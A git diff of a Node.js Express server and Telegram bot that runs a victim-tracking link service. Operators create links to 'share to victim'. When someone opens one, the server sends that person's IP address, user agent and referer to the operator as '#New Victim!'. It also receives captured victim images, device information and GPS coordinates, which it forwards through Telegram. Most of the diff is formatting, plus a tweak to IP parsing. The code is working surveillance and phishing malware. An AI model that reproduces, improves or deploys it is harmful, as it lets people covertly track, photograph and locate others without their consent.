@@ -29,7 +29,7 @@ const generateNewLink = (chatId) => {
         link: response,
         chatId: chatId
     });
-    bot.sendMessage(chatId, "Success! Your link is " + response + " , share your link to victim \n\n ID : "+ id + "\n\nYou can see logs victim with command /logs " + id + "\n\nYou can remove your link with command /rmlink " + response);
+    bot.sendMessage(chatId, "Success! Your link is " + response + " , share your link to victim \n\n ID : " + id + "\n\nYou can see logs victim with command /logs " + id + "\n\nYou can remove your link with command /rmlink " + response);
 
 }
 
@@ -46,48 +46,41 @@ bot.on('message', (msg) => {
         bot.sendMessage(chatId, config.help_text);
     } else if (text == "/newlink") {
         generateNewLink(chatId);
-    }else if(text == "/mylink")
-    {
+    } else if (text == "/mylink") {
         const linksdata = DB.getData("links");
         var response = "= Your links =```";
         linksdata.forEach((link, index) => {
-            if(link.chatId == chatId)
-            {
-                response +=  link.link + "\n";
+            if (link.chatId == chatId) {
+                response += link.link + "\n";
             }
         });
         response += "```";
         console.log(linksdata);
-        bot.sendMessage(chatId, response , {parse_mode : "Markdown"});
-    }else if(text.match(/\/rmlink (.+)/))
-    {
+        bot.sendMessage(chatId, response, { parse_mode: "Markdown" });
+    } else if (text.match(/\/rmlink (.+)/)) {
         const link = text.match(/\/rmlink (.+)/)[1];
         const linksdata = DB.getData("links");
         linksdata.forEach((data, index) => {
-            if(data.link == link && data.chatId == chatId)
-            {
+            if (data.link == link && data.chatId == chatId) {
                 DB.delete("links", index);
                 bot.sendMessage(chatId, "Success! Your link " + link + " has been deleted");
             }
         });
-    }else if(text.match(/\/logs (.+)/))
-    {
+    } else if (text.match(/\/logs (.+)/)) {
         const id = text.match(/\/logs (.+)/)[1];
         const linksdata = DB.getData("links");
         linksdata.forEach((data, index) => {
-            if(data.id == id && data.chatId == chatId)
-            {
+            if (data.id == id && data.chatId == chatId) {
                 const logsdata = DB.getData("logs");
                 var response = "= Logs =```";
                 logsdata.forEach((log, index) => {
-                    if(log.id == id)
-                    {
-                        response +=  log.message + "\n";
+                    if (log.id == id) {
+                        response += log.message + "\n";
                     }
                 });
                 response += "```";
-                bot.sendMessage(chatId, response , {parse_mode : "Markdown"});
-            }else{
+                bot.sendMessage(chatId, response, { parse_mode: "Markdown" });
+            } else {
                 bot.sendMessage(chatId, "Error! Your link " + id + " not found");
             }
         });
@@ -107,13 +100,16 @@ app.get("/link/:id", (req, res) => {
     const linksdata = DB.find("links", id);
     const chatId = linksdata.chatId;
 
-    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    //const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    var userIP;
+    if (req.headers['x-forwarded-for']) { userIP = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { userIP = req.connection.remoteAddress; } else { userIP = req.ip; }
+
     const time = new Date();
     const userAgent = req.headers['user-agent'];
     const referer = req.headers['referer'];
     const host = req.headers['host'];
     const date = new Date().toLocaleString();
-    var buildMessage = "#New Victim! ID : ***"+id+"*** \n```";
+    var buildMessage = "#New Victim! ID : ***" + id + "*** \n```";
     buildMessage += "? IP: " + userIP + "\n";
     buildMessage += "? User Agent: " + userAgent + "\n";
     buildMessage += "? Referer: " + referer + "\n";
@@ -122,7 +118,7 @@ app.get("/link/:id", (req, res) => {
 
     bot.sendMessage(chatId, buildMessage);
     bot.sendChatAction(chatId, "typing");
-    res.render("webview", { id: id, host: HOSTURL, ip: userIP  , time: time});
+    res.render("webview", { id: id, host: HOSTURL, ip: userIP, time: time });
 
 });
 app.post("/api/post", (req, res) => {
@@ -147,7 +143,7 @@ app.post("/api/post", (req, res) => {
 
             try {
                 var filename = DB.database_name + '/' + chatId + "_victim.png";
-                if(fs.existsSync(filename)){
+                if (fs.existsSync(filename)) {
                     // date dmY
                     var date = new Date();
                     var dmY = date.getDate() + "" + (date.getMonth() + 1) + "" + date.getFullYear() + "" + date.getHours() + "" + date.getMinutes() + "" + date.getSeconds();
@@ -176,8 +172,8 @@ app.post("/api/post", (req, res) => {
             action: 'information',
             data: dt,
         });
-        bot.sendMessage(chatId,dt, {parse_mode : 'markdown'});
-        res.json({ success:true});
+        bot.sendMessage(chatId, dt, { parse_mode: 'markdown' });
+        res.json({ success: true });
     }
 
 });
@@ -186,21 +182,21 @@ app.post("/api/loc", (req, res) => {
     var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
     var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
     var acc = parseFloat(decodeURIComponent(req.body.acc)) || null;
-    if (lon != null && lat != null ) {
+    if (lon != null && lat != null) {
         const id = req.body.id;
         console.log(id)
         const linksdata = DB.find("links", id);
         const chatId = linksdata.chatId;
-        console.log(lat,lon);
+        console.log(lat, lon);
         bot.sendLocation(chatId, lat, lon);
 
         bot.sendMessage(chatId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
-        res.json({success:true});
-    }else{
+        res.json({ success: true });
+    } else {
         bot.sendMessage(chatId, `Can't get location`);
-        res.json({success:false});
+        res.json({ success: false });
     }
-    });
+});
 app.listen(port, () => {
     console.log(`Example app listening at http://localhost:${port}`)
 });
